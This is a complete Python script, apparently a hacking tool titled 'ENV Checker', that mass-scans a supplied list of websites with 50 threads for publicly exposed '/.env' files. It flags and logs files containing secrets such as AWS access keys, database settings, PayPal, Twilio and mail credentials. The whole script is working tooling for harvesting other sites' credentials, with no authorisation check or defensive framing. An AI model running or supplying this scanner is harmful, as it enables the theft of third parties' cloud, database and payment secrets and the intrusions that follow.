import requests,os,sys,concurrent.futures,threading

red = '\033[31m'
green = '\033[32m'

lala = sys.argv[1]
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

if not os.path.isdir('results'):
    os.mkdir('results')
def logo():
    x = '''
    ██╗  ██╗███████╗███╗   ██╗████████╗ █████╗ ██╗
    ██║  ██║██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██║
    ███████║█████╗  ██╔██╗ ██║   ██║   ███████║██║
    ██╔══██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██║██║
    ██║  ██║███████╗██║ ╚████║   ██║   ██║  ██║██║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝
      ENV Checker | Developer @Sh0ya1337 | V1.0'''
    print("\x1b[1;31m"+x+"\x1b[0m \n")

def checksitecode(site):
    try:
        checksite = "http://" + site + "/.env"
        mainreq = requests.get(checksite, timeout=30, headers=Headers)
        if 'APP_NAME=' in str(mainreq.content) or 'APP_KEY=' in str(mainreq.content) or 'PUSHER_APP_ID=' in str(mainreq.content) or 'AWS_BUCKET=' in str(mainreq.content) or 'DB_HOST=' in str(mainreq.content) or 'PAYPAL_' in str(mainreq.content) or 'AWS_ACCESS_KEY_ID=' in str(mainreq.content) or 'AWS_KEY=' in str(mainreq.content) or 'REDIS_' in str(mainreq.content) or 'DB_' in str(mainreq.content) or 'NEXMO_' in str(mainreq.content) or 'TWILIO_' in str(mainreq.content) or 'MAIL_HOST=' in str(mainreq.content):
            print(green+" [*] " + site + "/.env")
            open('results/'+lala+'.txt','a').write(checksite+'\n')
        else:
            print(red+" [x] "+checksite)
    except:
        print(red+" [1] "+checksite)

if __name__ == '__main__':
    logo()
    try:
        Target = "list/"+lala
        List = open(Target, 'r').read().splitlines()
        try:
            with concurrent.futures.ThreadPoolExecutor(50) as executor:
                executor.map(checksitecode, List)
        except Exception as e:
            print(e)
    except Exception as e:
        print(e)